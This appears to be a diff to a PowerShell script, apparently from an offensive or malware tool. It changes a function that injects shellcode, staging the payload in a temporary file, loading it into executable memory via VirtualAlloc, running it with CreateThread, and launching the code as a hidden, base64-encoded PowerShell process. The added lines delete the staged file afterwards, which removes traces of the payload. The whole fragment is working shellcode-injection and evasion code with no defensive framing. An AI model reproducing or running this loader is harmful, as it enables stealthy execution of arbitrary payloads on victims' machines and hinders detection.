@@ -217,15 +217,17 @@ function _scInject($shellcode) {
 }
 
 function _scInjectSafe($shellcode, $label) {
-    $b64=[Convert]::ToBase64String($shellcode)
+    $scPath="$env:TEMP\sc_$label.bin"
+    [IO.File]::WriteAllBytes($scPath,$shellcode)
     $scriptBlock = @"
-`$sc=[Convert]::FromBase64String('$b64')
+`$sc=[IO.File]::ReadAllBytes('$scPath')
 `$size=`$sc.Length
 `$k=Add-Type -MemberDefinition '[DllImport(\"kernel32.dll\")] public static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p); [DllImport(\"kernel32.dll\")] public static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr f, IntPtr p, uint c, ref uint t);' -Name 'K' -PassThru
 `$addr=[K]::VirtualAlloc([IntPtr]::Zero,`$size,0x3000,0x40)
 [Runtime.InteropServices.Marshal]::Copy(`$sc,0,`$addr,`$size)
 `$tid=0
 [K]::CreateThread([IntPtr]::Zero,0,`$addr,[IntPtr]::Zero,0,[ref]`$tid)
+Remove-Item '$scPath' -Force
 "@
     $encoded=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($scriptBlock))
     Start-Process powershell.exe -ArgumentList "-NoP -EncodedCommand $encoded" -WindowStyle Hidden
